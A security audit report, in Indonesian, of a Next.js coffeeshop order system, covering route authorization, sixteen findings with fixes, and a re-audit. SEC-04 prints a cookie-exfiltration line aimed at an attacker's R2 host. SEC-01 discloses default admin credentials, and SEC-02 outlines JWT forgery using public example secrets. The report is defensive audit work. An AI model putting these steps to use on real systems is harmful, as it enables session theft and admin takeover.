# AUDIT-REPORT-KEAMANAN — Coffeeshop Order System

Tanggal: 2026-11-19
Mode: **read-only** (tidak ada perubahan kode sumber)
Ruang lingkup: `src/app/api/**` (44 route, ±50 handler), seluruh route publik, `src/proxy.ts` (middleware), service yang dipanggil route, `prisma/seed.ts`, `next.config.ts`, `.env.example`, riwayat git.
Tidak ada **server action** (`"use server"`) di repositori; seluruh mutasi melewati Route Handler.

## 1. Ringkasan Eksekutif

Total temuan: **16** — **1 Tinggi, 4 Sedang, 8 Rendah, 3 Informasi**. Tidak ada temuan Kritis.

Struktur otorisasi API sehat: **setiap** endpoint admin memakai `requireRole(["SUPER_ADMIN"])`, endpoint kasir memakai `requireRole(["CASHIER","SUPER_ADMIN"])`, dan pemeriksaan selalu ke database (`isActive` + `tokenVersion`), bukan sekadar klaim JWT. IDOR pesanan tertutup oleh `accessToken` 128-bit yang dibandingkan constant-time. Bukti bayar tersimpan di bucket privat. Tidak ditemukan SQL injection, XSS sink, open redirect, atau secret asli di riwayat git.

Risiko utama bersifat **konfigurasi/deployment**, bukan lubang kode: kredensial admin default yang dapat dipakai jika `SEED_ADMIN_PASSWORD` tidak diisi, serta nilai contoh `SESSION_SECRET`/`CRON_SECRET` yang valid secara validasi sehingga dapat dipakai apa adanya.

## 2. Matriks Endpoint × Peran

Legenda: **SA** = `SUPER_ADMIN`, **KS** = `CASHIER` + `SUPER_ADMIN`, **PUB** = publik tanpa sesi, **TOK** = wajib `accessToken` pesanan, **SEC** = wajib header secret.

### 2.1 Admin (hanya SA) — sesuai kode

| Endpoint | Method | Guard di kode |
|---|---|---|
| `/api/admin/audit` | GET | `requireRole(["SUPER_ADMIN"])` |
| `/api/admin/cashiers` | GET, POST | SA |
| `/api/admin/cashiers/[id]` | PATCH, DELETE | SA |
| `/api/admin/cashiers/[id]/reset-password` | POST | SA |
| `/api/admin/categories` | GET, POST | SA |
| `/api/admin/categories/reorder` | POST | SA |
| `/api/admin/categories/[id]` | PATCH, DELETE | SA |
| `/api/admin/dashboard` | GET | SA |
| `/api/admin/finance/attachment` | POST, GET | SA (+ rate limit 30/menit) |
| `/api/admin/finance/overview` | GET | SA |
| `/api/admin/finance/transactions` | GET, POST | SA |
| `/api/admin/finance/transactions/[id]` | PATCH, DELETE | SA |
| `/api/admin/payment-methods` | GET, POST | SA |
| `/api/admin/payment-methods/reorder` | POST | SA |
| `/api/admin/payment-methods/[id]` | PATCH, DELETE | SA |
| `/api/admin/products` | GET, POST | SA |
| `/api/admin/products/[id]` | PATCH, DELETE | SA |
| `/api/admin/settings` | GET, PATCH | SA |
| `/api/admin/stock` | GET | SA |
| `/api/admin/stock/adjust` | POST | SA |
| `/api/admin/stock/[productId]` | PATCH | SA |
| `/api/admin/stock/[productId]/movements` | GET | SA |
| `/api/admin/tables` | GET, POST | SA |
| `/api/admin/tables/[id]` | PATCH, DELETE | SA |
| `/api/admin/tables/[id]/qr` | GET | SA |
| `/api/admin/tables/[id]/regenerate` | POST | SA |
| `/api/upload/image` | POST | SA (+ rate limit 30/menit) |

Verifikasi: tidak ada satu pun handler admin yang lupa `await requireRole(...)`. `requireRole` → `getCurrentUser` → `authenticateSession` membaca `User` dari DB dan menolak bila `isActive=false` atau `tokenVersion` berbeda (`src/lib/auth.ts:44-68,117-120`). Klaim `role` di JWT **tidak** dipakai untuk otorisasi API; peran diambil dari DB.

### 2.2 Kasir (KS) — sesuai kode

| Endpoint | Method | Guard |
|---|---|---|
| `/api/cashier/orders` | GET | `requireRole(["CASHIER","SUPER_ADMIN"])` |
| `/api/cashier/orders/[id]` | GET | KS |
| `/api/cashier/orders/[id]/approve` | POST | KS |
| `/api/cashier/orders/[id]/reject` | POST | KS |
| `/api/cashier/orders/[id]/status` | POST | KS |
| `/api/cashier/orders/[id]/print` | POST | KS |
| `/api/cashier/orders/[id]/proof` | GET | KS (presigned 60 detik, bucket privat) |

Kasir **tidak** bisa memanggil endpoint admin: `requireRole(["SUPER_ADMIN"])` membandingkan peran DB, bukan klaim token. Tidak ada endpoint kasir yang menerima `role`, `total`, `price`, `version`, atau `status` bebas dari klien.

### 2.3 Publik / auth / cron / realtime

| Endpoint | Method | Guard | Rate limit |
|---|---|---|---|
| `/api/auth/login` | POST | publik (kredensial) | 5/15 mnt per IP+username; 20/15 mnt per IP |
| `/api/auth/logout` | POST | publik | — |
| `/api/cron/expire-orders` | GET | `Authorization: Bearer CRON_SECRET` (constant-time) | — |
| `/api/public/menu` | GET | token meja aktif | 120/menit/IP |
| `/api/public/orders` | POST | publik (meja + produk divalidasi server) | 20/menit/IP + 10/menit/token meja |
| `/api/public/orders/[code]` | GET | cookie/header `accessToken` | — |
| `/api/public/orders/[code]/access` | POST | kode akses | 10/10 mnt per kode+IP |
| `/api/public/orders/[code]/cancel` | POST | `accessToken` | **tidak ada** (SEC-08) |
| `/api/public/orders/[code]/payment` | POST | `accessToken` | 10/menit per kode+IP |
| `/api/pusher/auth` | POST | sesi + ACL per channel | **tidak ada** (SEC-05) |

Halaman `/admin/*` dan `/cashier/*` dijaga dua lapis: `src/proxy.ts` (redirect berdasarkan klaim JWT) dan layout server (`requireRole` ke DB). `/order/[code]` tidak memakai sesi; hanya cookie `order_<code>` berisi `accessToken`.

## 3. Temuan

### SEC-01 — Kredensial Super Admin default dapat dipakai di produksi
**Severity: Tinggi** · `prisma/seed.ts:11-12`, `.env.example:32-34`, `README.md:200`

`SEED_ADMIN_USERNAME` default `admin` dan `SEED_ADMIN_PASSWORD` default `Admin123456!`. Nilai ini juga ditulis di README dan `.env.example`. `seed.ts` langsung menghitung hash dari nilai default bila env tidak diisi, tanpa menolak produksi.

**Eksploitasi**
1. Operator menjalankan `npm run db:seed` (atau CI/deploy menjalankannya) tanpa `SEED_ADMIN_PASSWORD`.
2. Penyerang membuka `/login` dan memakai `admin` / `Admin123456!`.
3. Penyerang mendapat seluruh endpoint `SUPER_ADMIN`: ubah harga, stok, kasir, keuangan, audit, dan ekspor data.

**Perbaikan**
- Tolak seed di `NODE_ENV=production` bila `SEED_ADMIN_PASSWORD` kosong/placeholder; jangan pernah memakai fallback.
- Wajibkan reset password saat login pertama (flag `mustChangePassword`) dan tolak password default.
- Hapus nilai default dari README/`.env.example`; ganti dengan instruksi `openssl rand -base64 32`.

### SEC-02 — Nilai contoh secret valid + fallback SESSION_SECRET hardcoded
**Severity: Sedang** · `src/lib/env.ts:15-16`, `src/proxy.ts:55-56`, `.env.example:10-11`

`SESSION_SECRET` hanya divalidasi panjang ≥32; nilai contoh `at-least-32-character-random-secret-key-change-this` lolos. `CRON_SECRET` hanya ≥8 dan contohnya publik. `src/proxy.ts` masih memiliki fallback `"development-secret-must-be-at-least-32-chars-long!"` bila `process.env.SESSION_SECRET` kosong.

**Eksploitasi**
1. Deploy dengan `.env` hasil salin `.env.example` (secret tidak diubah).
2. Penyerang menandatangani JWT HS256 sendiri (`sub` + `role` + `tokenVersion`).
3. `proxy.ts` memakai klaim `role` untuk membuka halaman `/admin`; API memakai `sub` untuk memuat user dari DB. Bila ID user diketahui (mis. bocor di log/screenshot/UI), sesi dapat dipalsukan. `CRON_SECRET` yang publik juga memungkinkan siapa pun memicu `/api/cron/expire-orders`.

**Perbaikan**
- Tolak nilai contoh yang diketahui (denylist) di `env.ts`.
- Hapus fallback di `proxy.ts`; lempar error bila secret tidak ada.
- Naikkan `CRON_SECRET` minimum menjadi 32 karakter; batasi endpoint cron ke header yang benar.
- Pertimbangkan `SESSION_SECRET` berputar dan `tokenVersion` global saat rotasi.

### SEC-03 — Enumerasi username lewat timing login
**Severity: Sedang** · `src/app/api/auth/login/route.ts:56,82,91`

User tidak ada atau `isActive=false` langsung dibalas tanpa `argon2.verify`; user valid menjalankan Argon2 (puluhan ms). Selisih waktu dapat diukur. Pesan error memang seragam, tetapi waktu tidak.

**Eksploitasi**
1. Kirim login untuk daftar username kandidat.
2. Ukur waktu respons; username valid konsisten lebih lambat.
3. Gunakan username valid untuk serangan kredensial tertarget (rate limit per IP+username tetap, tetapi daftar akun jadi diketahui).

**Perbaikan**
- Selalu jalankan `argon2.verify` terhadap hash dummy saat user tidak ada/tidak aktif.
- Samakan jalur audit dan respons untuk semua kegagalan.
- Tambahkan batas panjang `password` (mis. 128) di `loginSchema`.

### SEC-04 — CSP produksi melemahkan pertahanan XSS
**Severity: Sedang** · `next.config.ts:18-22`

`script-src 'self' 'unsafe-inline'` di produksi, dan `img-src`/`connect-src` memakai wildcard `https://*.r2.cloudflarestorage.com`. Penyerang dapat memakai bucket R2 miliknya sendiri (`<akun>.r2.cloudflarestorage.com`) sebagai tujuan eksfiltrasi.

**Eksploitasi**
1. Temukan celah XSS (saat ini tidak ada sink `dangerouslySetInnerHTML`/`innerHTML`, sehingga ini lapisan pertahanan).
2. Muat `new Image().src = "https://attacker.r2.cloudflarestorage.com/?c=" + document.cookie` — lolos `img-src`, atau `fetch(...)` — lolos `connect-src`.

**Perbaikan**
- Ganti `'unsafe-inline'` dengan nonce/hash untuk skrip Next.
- Ikat origin R2 ke host akun spesifik (`<R2_ACCOUNT_ID>.r2.cloudflarestorage.com`) dan domain publik (`R2_PUBLIC_BASE_URL`), bukan `*.r2.cloudflarestorage.com`.
- Pertahankan `object-src 'none'`, `frame-ancestors 'none'`, dan `base-uri 'self'` yang sudah ada.

### SEC-05 — `/api/pusher/auth` tanpa rate limit; channel meja dapat di-subscribe pemegang token
**Severity: Sedang** · `src/app/api/pusher/auth/route.ts:39-106`

Setiap request melakukan query `User`/`Order`/`Table` tanpa pembatasan laju. Channel `private-table-<token>` hanya memeriksa meja aktif; siapa pun yang pernah melihat QR (token ada di URL `/m/<token>`) dapat terus berlangganan event stok meja tersebut. Channel pesanan/kasir/admin sudah benar.

**Eksploitasi**
1. Kirim ribuan `POST /api/pusher/auth` dengan `socket_id`/`channel_name` acak untuk membebani DB.
2. Pemegang token meja berlangganan `private-table-<token>` dan memantau perubahan stok.

**Perbaikan**
- Tambahkan `consumeRateLimit("pusher:auth:<ip>", 30, 60)`.
- Batasi channel meja ke data yang memang publik (stok agregat), atau turunkan menjadi event tanpa detail internal.
- Pertimbangkan masa berlaku langganan meja.

### SEC-06 — Kode pesanan hanya 4 digit hex + oracle 404/403
**Severity: Rendah** · `src/app/api/public/orders/route.ts:189`, `src/server/services/orders.ts:75,78-79`

`crypto.randomBytes(2)` → 65.536 kemungkinan per tanggal. `loadOrderWithAccess` membedakan 404 (kode tidak ada) dan 403 (token salah), sehingga keberadaan kode bisa dienumerasi. Data tetap aman karena `accessToken` 128-bit.

**Eksploitasi**
1. Enumerasi `ORD-<tanggal>-XXXX` lewat `/api/public/orders/[code]` atau `/access`.
2. Kumpulkan kode valid (404 vs 403), lalu coba menebak token — tidak layak secara komputasi, tetapi kode valid berguna untuk phishing/social engineering.

**Perbaikan**
- Naikkan entropi kode (6–8 byte) atau tambahkan bagian acak panjang.
- Kembalikan respons seragam (mis. 404) untuk kode tidak ada dan token salah.
- Tambahkan rate limit agregat per IP untuk endpoint `[code]`.

### SEC-07 — `CRON_SECRET` minimum 8 karakter; perbandingan bocor panjang
**Severity: Rendah** · `src/lib/env.ts:16`, `src/lib/order-access.ts:26-31`

Secret 8 karakter bisa lemah bila dipilih manusia. `timingSafeEqualString` mengembalikan `false` segera saat panjang berbeda, sehingga panjang secret dapat ditebak.

**Perbaikan**
- Minimum 32 karakter acak; tolak nilai contoh.
- Bandingkan dengan hash (HMAC) agar panjang tidak teramati.

### SEC-08 — Tidak ada rate limit pada cancel dan pusher auth
**Severity: Rendah** · `src/app/api/public/orders/[code]/cancel/route.ts`, `src/app/api/pusher/auth/route.ts`

`cancel` hanya dijaga token 128-bit; tanpa rate limit, percobaan token masih tak terbatas secara teori (walau tidak layak). Pusher auth dibahas di SEC-05; di sini dampaknya beban request.

**Perbaikan**
- `consumeRateLimit("cancel:<code>:<ip>", 10, 60)`.
- Terapkan rate limit pusher auth seperti SEC-05.

### SEC-09 — `accessToken` pesanan plaintext di DB dan diterima lewat header
**Severity: Rendah** · `prisma/schema.prisma:134`, `src/lib/order-access.ts:14-22`

Token disimpan apa adanya; kebocoran backup DB memberi akses ke semua pesanan aktif. `x-order-token` menambah permukaan di luar cookie (dipakai tes; klien produksi memakai cookie).

**Perbaikan**
- Simpan hash token (mis. SHA-256) dan bandingkan hash; kirim token mentah hanya ke klien.
- Bila header tidak dipakai produksi, hapus jalur `x-order-token`.

### SEC-10 — Tidak ada jaminan bucket privat ≠ bucket publik
**Severity: Rendah** · `src/lib/env.ts:20-21`, `src/server/services/upload.ts:34-39`

Bila `R2_BUCKET_PRIVATE` dikonfigurasi sama dengan `R2_BUCKET_PUBLIC`, bukti bayar masuk ke bucket publik dan URL-nya dapat diakses tanpa signed URL.

**Perbaikan**
- Tolak startup bila `R2_BUCKET_PRIVATE === R2_BUCKET_PUBLIC`.
- Tambahkan uji konfigurasi di CI.

### SEC-11 — Modul server diimpor komponen client
**Severity: Rendah** · `src/app/admin/settings/realtime-test/page.tsx:8`

`emitToChannel` dari `src/lib/pusher-server.ts` diimpor di file `"use client"`. Secret tidak ikut ter-inline (hanya `NEXT_PUBLIC_*`), tetapi modul server masuk bundel client dan fitur tombol uji menjadi mati karena `PUSHER_SECRET` `undefined` di browser.

**Perbaikan**
- Tambahkan `import "server-only"` di `pusher-server.ts` dan pindahkan aksi uji ke Route Handler khusus admin.

### SEC-12 — Kerentanan dependensi dev (critical) dan sisa moderate
**Severity: Rendah** (dev-only) · `package-lock.json`

`npm audit` penuh: **2 critical** (`vitest`, `tinypool` — RCE/prototype pollution saat menjalankan tes), 11 moderate. `npm audit --omit=dev`: **0 high/critical**, 4 moderate (`shadcn` → `ts-morph` → `@ts-morph/common` → `minimatch`), semuanya rantai tooling dev. CI sudah menggagalkan high runtime.

**Perbaikan**
- Upgrade `vitest` ke versi yang menambal `tinypool`.
- Regenerasi lockfile saat `npm install` tidak diblokir; verifikasi flag `dev` transitive.
- Jalankan `npm audit --omit=dev --audit-level=high` di CI (sudah ada).

### SEC-13 — `TRUSTED_PROXY=none` di belakang proxy menyatukan bucket rate limit
**Severity: Rendah** · `src/lib/env.ts:9-13`, `src/lib/client-ip.ts:46-54`

Default `none` membuat semua request memakai IP `"unknown"` bila aplikasi berada di belakang proxy yang tidak meneruskan `request.ip`. Dampak: bucket login global 20/15 menit dan checkout global 20/menit — penyerang dapat memicu lockout/outage. Tidak ada pemalsuan header (T-07 tetap benar).

**Perbaikan**
- Dokumentasikan `TRUSTED_PROXY` di README dan set sesuai platform (Vercel `vercel`, Cloudflare `cloudflare`, atau jumlah hop).
- Tambahkan health check yang memperingatkan bila mode `none` terdeteksi di produksi.

### SEC-14 — Hardening cookie sesi dan logout stateless
**Severity: Informasi** · `src/lib/session.ts:37-44,86-99`

Cookie: `httpOnly`, `secure` di produksi, `sameSite=lax`, 12 jam. Belum memakai prefix `__Host-`; logout hanya menghapus cookie, JWT tetap valid sampai `exp` bila dicuri.

**Perbaikan**
- Gunakan `__Host-session_token` (tanpa Domain, Path=/).
- Pertimbangkan denylist `jti` atau naikkan `tokenVersion` saat logout (opsional).

### SEC-15 — `readJson` tanpa batas ukuran body pada endpoint admin
**Severity: Informasi** · `src/lib/api.ts:47-65`

Endpoint publik sudah membatasi `content-length` (checkout 64 KB, upload 12 MB). Endpoint admin terautentikasi memakai `readJson` tanpa batas eksplisit; payload besar membebani memori/DB.

**Perbaikan**
- Tambahkan batas `content-length` (mis. 256 KB) di `readJson`.

### SEC-16 — `Cache-Control` tidak eksplisit pada GET terautentikasi
**Severity: Informasi** · route admin/kasir

Route handler GET saat ini dinamis (build menandai `ƒ`), tetapi tidak ada header `Cache-Control: no-store` eksplisit. Sebagian proxy/CDN dapat menyimpan respons berisi data pesanan.

**Perbaikan**
- Tambahkan `Cache-Control: private, no-store` pada respons admin/kasir dan pesanan.

## 4. Item yang Diverifikasi Aman

1. **Otorisasi** — 100% handler admin/kasir memanggil `requireRole`; pemeriksaan ke DB (`isActive`, `tokenVersion`), bukan klaim JWT. Halaman admin/kasir juga dijaga layout server.
2. **IDOR pesanan** — `/api/public/orders/[code]`, `/cancel`, `/payment` mewajibkan `accessToken`; perbandingan `crypto.timingSafeEqual`; DTO tidak memuat `accessToken`, `proofKey`, atau `passwordHash` (dibuktikan `tests/security.test.ts`).
3. **IDOR kasir→admin** — ditolak oleh peran DB; tidak ada endpoint admin yang menerima peran dari klien.
4. **Validasi input** — harga, subtotal, total, `status`, `version`, `role` tidak pernah dipercaya dari klien. Zod dipakai di route atau service; field tak dikenal dibuang. `updateSettings`/`updateProduct` memakai skema tanpa default.
5. **Upload** — magic bytes (JPEG/PNG/WEBP/GIF/TIFF/BMP/AVIF/HEIC), batas 10 MB dan 4096×4096, `limitInputPixels`, nama file `nanoid(16)`, konversi ulang ke AVIF (EXIF hilang). Bukti bayar & lampiran keuangan memakai bucket privat + signed URL 60 detik; produk/QRIS publik.
6. **Kebocoran data** — tidak ada `passwordHash`, `accessToken` pesanan, `proofKey`, atau secret di respons API/DTO; `logger` meredaksi kunci sensitif; `x-order-token` hanya menerima token, bukan membocorkannya.
7. **Sesi** — cookie `httpOnly`, `secure` produksi, `sameSite=lax`, 12 jam; `tokenVersion` menaik saat nonaktif/reset password; kasir nonaktif ditolak API dan diputus realtime (`user.deactivated`).
8. **Pusher** — ACL per channel: `private-cashier` (kasir/admin), `private-admin` (admin), `private-user-<id>` (hanya diri), `private-order-<code>` (cookie token constant-time), `private-table-<token>` (meja aktif). Tidak ada channel tanpa otorisasi.
9. **Rate limit** — login, checkout, upload, menu, akses pesanan, dan bukti bayar sudah dibatasi (PostgreSQL atomik). Celah cancel/pusher auth dicatat sebagai SEC-05/SEC-08.
10. **Header/CSRF** — CSP, HSTS (produksi), `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `object-src 'none'`, `nosniff`, Referrer-Policy, Permissions-Policy. Proxy menolak mutasi lintas situs berbasis `Origin`/`Referer` + `Sec-Fetch-Site`; `Origin` palsu dan `Host` palsu tidak berpengaruh (`APP_BASE_URL`/`ALLOWED_ORIGINS`). Tidak ada CORS longgar.
11. **Rahasia** — hanya `.env.example` dan `.env.test` (tanpa rahasia) yang ter-track; `git log -S` untuk `AKIA`, `sk_live`, `R2_SECRET_ACCESS_KEY`, `SESSION_SECRET=` hanya menemukan placeholder. `NEXT_PUBLIC_*` hanya kunci Pusher (memang publik).
12. **Injeksi** — seluruh `$queryRaw`/`$executeRaw` memakai tagged template Prisma (parameterized); tidak ada `queryRawUnsafe`. Tidak ada `dangerouslySetInnerHTML`/`innerHTML`; tidak ada redirect dari input pengguna.
13. **Cron** — `/api/cron/expire-orders` membandingkan `Authorization: Bearer CRON_SECRET` constant-time; `vercel.json` terjadwal tiap menit.
14. **Keuangan** — `attachKey` wajib berprefix `attachments/finance/`, `..` ditolak, signed URL 60 detik, hanya `SUPER_ADMIN`.

## 5. Rekomendasi Prioritas

1. **Segera (sebelum deploy):** SEC-01 dan SEC-02 — ganti kredensial admin, hasilkan `SESSION_SECRET`/`CRON_SECRET` acak, hapus fallback, tolak placeholder.
2. **Sprint berikutnya:** SEC-03 (timing login), SEC-04 (CSP nonce + origin R2 spesifik), SEC-05 (rate limit Pusher).
3. **Backlog:** SEC-06…SEC-13; SEC-14…SEC-16 sebagai hardening.
4. Jalankan ulang `npm audit --omit=dev --audit-level=high` di CI (sudah ada) dan tambahkan audit penuh berkala untuk dependensi dev.

## 6. Lampiran — Perintah Pemeriksaan

```bash
# Inventaris route + guard
node -e "..."            # pemindaian 44 route: method, requireRole, Zod, rate limit, raw SQL
npm audit --omit=dev --json
npm audit --json
git ls-files | findstr /R "^\.env"
git log --all -S "AKIA"; git log --all -S "sk_live"
git log --all -S "SESSION_SECRET="
```

Hasil kunci:
- `npm audit --omit=dev`: 4 moderate, 0 high, 0 critical.
- `npm audit` (penuh): 2 critical (`vitest`, `tinypool`), 11 moderate, 0 high runtime.
- `.env` ter-track: hanya `.env.example` dan `.env.test`.
- Tidak ditemukan secret asli di riwayat git.

---

## 7. Status Perbaikan

Cabang: `fix/security-audit-2026-11`. Baseline (2026-11-20): `typecheck` lulus, `lint` lulus, `test` 117/117 lulus, `build` lulus, `npm audit --omit=dev` → **7 kerentanan (3 high, 4 moderate)** — berbeda dari laporan awal; high berasal dari rantai `prisma` → `@prisma/config` → `effect` (ReDoS).

| ID | Tingkat | Status | Commit |
|---|---|---|---|
| SEC-01 | Tinggi | Selesai | `152ab8f` |
| SEC-02 | Sedang | Selesai | `0845730` |
| SEC-03 | Sedang | Selesai | `624f976` |
| SEC-04 | Sedang | Selesai (Report-Only default) | `76f282b` |
| SEC-05 | Sedang | Selesai | `b81f513` |
| SEC-06 | Rendah | Selesai | `a5f7e88` |
| SEC-07 | Rendah | Selesai | `e8ab300` |
| SEC-08 | Rendah | Selesai | `7a9142e` |
| SEC-09 | Rendah | Selesai (contract pending) | `8dd6d10` |
| SEC-10 | Rendah | Selesai | `67972d0` |
| SEC-11 | Rendah | Selesai | `25003b8` |
| SEC-12 | Rendah | Selesai | `9f78784`, `e5fd3e0` |
| SEC-13 | Rendah | Selesai | `f314a02` |
| SEC-14 | Informasi | Selesai | `7fdedbd` |
| SEC-15 | Informasi | Selesai | `7978acd` |
| SEC-16 | Informasi | Selesai | `facb8a1` |

Verifikasi akhir (2026-11-20): `typecheck` lulus, `lint` lulus, `test` 171/171 lulus, `test:unit` 10/10 lulus, `build` lulus, `npm audit` 0 kerentanan.

---

## 8. Re-Audit (2026-11-20, read-only)

Verifikasi ulang dilakukan dengan membaca kode, menjalankan tes terkait, dan menembak server produksi lokal (`npm run build` + `npm start`). Baseline tes: **171/171** (`npm run test`), **10/10** (`npm run test:unit`), `typecheck`/`lint`/`build` lulus, `npm audit` dan `npm audit --omit=dev --audit-level=high` = **0 kerentanan**.

| ID | Status re-audit | Bukti / catatan |
|---|---|---|
| SEC-01 | Terverifikasi | Seed tanpa `SEED_ADMIN_*` gagal; policy password production menolak placeholder; `mustChangePassword: true`; README/.env.example tanpa kredensial default. |
| SEC-02 | Terverifikasi | `KNOWN_EXAMPLE_SECRETS` + `hasLowEntropy` menolak di production; tidak ada fallback secret (`requireSessionSecret` fail-closed). |
| SEC-03 | Terverifikasi | Login memakai hash dummy saat user tidak ada; username/password dibatasi; respons gagal seragam. |
| SEC-04 | Terverifikasi dengan catatan | `script-src` tanpa `'unsafe-inline'`, nonce per request, origin R2 eksplisit; header diperiksa via `curl`. **Default Report-Only** karena shell PPR tanpa nonce — belum menegakkan XSS sampai `CSP_ENFORCE=true` layak. |
| SEC-05 | Terverifikasi | Rate limit 30/60s per IP + 60/60s per user; payload meja hanya `{productId, available}`. |
| SEC-06 | Terverifikasi | Kode `ORD-YYMMDD-` + 8 base32; 404 seragam untuk kode/token salah; tes collision hijau. |
| SEC-07 | Terverifikasi | `CRON_SECRET` ≥32 di production; perbandingan memakai HMAC `timingSafeEqual`. |
| SEC-08 | Terverifikasi | Cancel 10/60s per kode+IP; GET order 60/60s per IP. |
| SEC-09 | Terverifikasi dengan catatan | `accessTokenHash` terisi untuk pesanan baru, plaintext `null`; fallback baca pesanan lama. Backfill produksi **belum dijalankan**; migrasi contract masih di `migrations-pending`. |
| SEC-10 | Terverifikasi | Env menolak bucket sama; `/api/health` memeriksa objek privat (403/404 = lulus, jaringan = `skipped`). |
| SEC-11 | Terverifikasi | `import "server-only"` di 20 modul; build sukses membuktikan tidak ada impor server di bundel client; event uji lewat route admin. |
| SEC-12 | Terverifikasi | `vitest` 5.1.1, `shadcn` devDependency, override `effect`/`minimatch`; audit penuh 0. |
| SEC-13 | Terverifikasi | `TRUSTED_PROXY` wajib eksplisit di production; fallback `unknown:<fingerprint>`; health melaporkan `unknownIpRequests`. |
| SEC-14 | Terverifikasi | `__Host-session_token` di production (Secure, Path=/, tanpa Domain, httpOnly, Lax); dev/test nama lama; logout stateless. |
| SEC-15 | Terverifikasi dengan catatan | `readJson` streaming 256 KB / checkout 64 KB; 413 `PAYLOAD_TOO_LARGE` termasuk saat Content-Length dipalsukan. Upload multipart masih memakai batas Content-Length (lihat N-01). |
| SEC-16 | Terverifikasi | Header `Cache-Control` diperiksa via `curl` pada admin, cashier, orders, auth, pusher auth, upload, menu; tes memindai seluruh route handler kelompok sensitif. |

### Temuan baru (re-audit)

| ID | Tingkat | Temuan | Rekomendasi |
|---|---|---|---|
| N-01 | Rendah | Tiga route multipart (`/api/upload/image`, `/api/admin/finance/attachment`, `/api/public/orders/[code]/payment`) memeriksa `Content-Length` lalu memanggil `req.formData()`; header palsu dapat membuat body besar dibuffer sebelum validasi ukuran file. | Batasi byte saat stream multipart atau set batas body di reverse proxy; saat ini dampak dibatasi rate limit + validasi 10 MB setelah buffer. |
| N-02 | Informasi | CSP masih Report-Only default (SEC-04). | Aktifkan `CSP_ENFORCE=true` setelah shell PPR bisa membawa nonce atau prerender dimatikan. |
| N-03 | Informasi | Pesanan lama/demo masih menyimpan `accessToken` plaintext; fallback kompatibilitas masih aktif. | Jalankan `scripts/backfill-access-token-hash.ts` di produksi lalu eksekusi migrasi contract. |
| N-04 | Informasi | `/api/health` tidak mengirim `Cache-Control`. | Tambahkan `no-store` bila endpoint diekspos publik. |
| N-05 | Informasi | Fallback IP berbasis User-Agent/Accept-Language dapat dirotasi penyerang bila `TRUSTED_PROXY` salah konfigurasi. | Produksi wajib konfigurasi eksplisit (sudah ditegakkan); pantau `unknownIpRequests` di health. |

**Kesimpulan:** seluruh SEC-01…SEC-16 terverifikasi; tidak ada regresi pada auth, orders, realtime, proxy, maupun env.
Sisa risiko bersifat terdokumentasi (CSP Report-Only, backfill/contract SEC-09, batas multipart, health cache).
